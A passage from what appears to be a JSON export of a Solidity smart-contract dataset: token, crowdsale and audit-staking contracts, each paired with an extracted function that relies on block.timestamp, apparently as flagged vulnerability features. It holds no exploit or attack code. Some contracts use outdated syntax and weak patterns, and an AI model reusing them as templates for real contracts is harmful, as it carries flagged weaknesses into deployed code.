whenNotPaused{\n super.release(_beneficiary);\n }\n}\ncontract DELCToken is BurnableToken, MintableToken, PausableToken {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor() public {\n name = \"DELC Relation Person Token\";\n symbol = \"DELC\";\n decimals = 18;\n totalSupply = 10000000000 * 10 ** uint256(decimals);\n balances[msg.sender] = totalSupply;\n emit Transfer(address(0), msg.sender, totalSupply);\n }\n}",
  "extract_feature": [
    "function vestedAmount(address _beneficiary) public view returns (uint256) {\ntokenToVest storage value = vestToMap[_beneficiary];\nuint256 totalBalance = value.torelease;\nif (block.timestamp < value.cliff) {\nreturn 0;\n} else if (block.timestamp >= value.start.add(value.duration)) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(value.start)).div(value.duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1eef"
  },
  "filename": "292.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef0"
  },
  "filename": "2948.sol",
  "content": "pragma solidity 0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BGAudit is Ownable {\n using SafeMath for uint;\n event AddedAuditor(address indexed auditor);\n event BannedAuditor(address indexed auditor);\n event AllowedAuditor(address indexed auditor);\n event CreatedAudit(uint indexed id);\n event ReviewingAudit(uint indexed id);\n event AuditorRewarded(uint indexed id, address indexed auditor, uint indexed reward);\n event AuditorStaked(uint indexed id, address indexed auditor, uint indexed amount);\n event WithdrawedStake(uint indexed id, address indexed auditor, uint indexed amount);\n event SlashedStake(uint indexed id, address indexed auditor);\n enum AuditStatus { New, InProgress, InReview, Completed }\n struct Auditor {\n bool banned;\n address addr;\n uint totalEarned;\n uint completedAudits;\n uint[] stakedAudits;\n mapping(uint => bool) stakedInAudit;\n mapping(uint => bool) canWithdrawStake;\n }\n struct Audit {\n AuditStatus status;\n address owner;\n uint id;\n uint totalReward;\n uint remainingReward;\n uint stake;\n uint endTime;\n uint maxAuditors;\n address[] participants;\n }\n uint public stakePeriod = 90 days;\n uint public maxAuditDuration = 365 days;\n Audit[] public audits;\n mapping(address => Auditor) public auditors;\n function transfer(address _to, uint _amountInWei) external onlyOwner {\n require(address(this).balance > _amountInWei);\n _to.transfer(_amountInWei);\n }\n function setStakePeriod(uint _days) external onlyOwner {\n stakePeriod = _days * 1 days;\n }\n function setMaxAuditDuration(uint _days) external onlyOwner {\n maxAuditDuration = _days * 1 days;\n }\n function addAuditor(address _auditor) external onlyOwner {\n require(auditors[_auditor].addr == address(0));\n auditors[_auditor].banned = false;\n auditors[_auditor].addr = _auditor;\n auditors[_auditor].completedAudits = 0;\n auditors[_auditor].totalEarned = 0;\n emit AddedAuditor(_auditor);\n }\n function banAuditor(address _auditor) external onlyOwner {\n require(auditors[_auditor].addr != address(0));\n auditors[_auditor].banned = true;\n emit BannedAuditor(_auditor);\n }\n function allowAuditor(address _auditor) external onlyOwner {\n require(auditors[_auditor].addr != address(0));\n auditors[_auditor].banned = false;\n emit AllowedAuditor(_auditor);\n }\n function createAudit(uint _stake, uint _endTimeInDays, uint _maxAuditors) external payable onlyOwner {\n uint endTime = _endTimeInDays * 1 days;\n require(endTime < maxAuditDuration);\n require(block.timestamp + endTime * 1 days > block.timestamp);\n require(msg.value > 0 && _maxAuditors > 0 && _stake > 0);\n Audit memory audit;\n audit.status = AuditStatus.New;\n audit.owner = msg.sender;\n audit.id = audits.length;\n audit.totalReward = msg.value;\n audit.remainingReward = audit.totalReward;\n audit.stake = _stake;\n audit.endTime = block.timestamp + endTime;\n audit.maxAuditors = _maxAuditors;\n audits.push(audit);\n emit CreatedAudit(audit.id);\n }\n function reviewAudit(uint _id) external onlyOwner {\n require(audits[_id].status == AuditStatus.InProgress);\n require(block.timestamp >= audits[_id].endTime);\n audits[_id].endTime = block.timestamp;\n audits[_id].status = AuditStatus.InReview;\n emit ReviewingAudit(_id);\n }\n function rewardAuditor(uint _id, address _auditor, uint _reward) external onlyOwner {\n 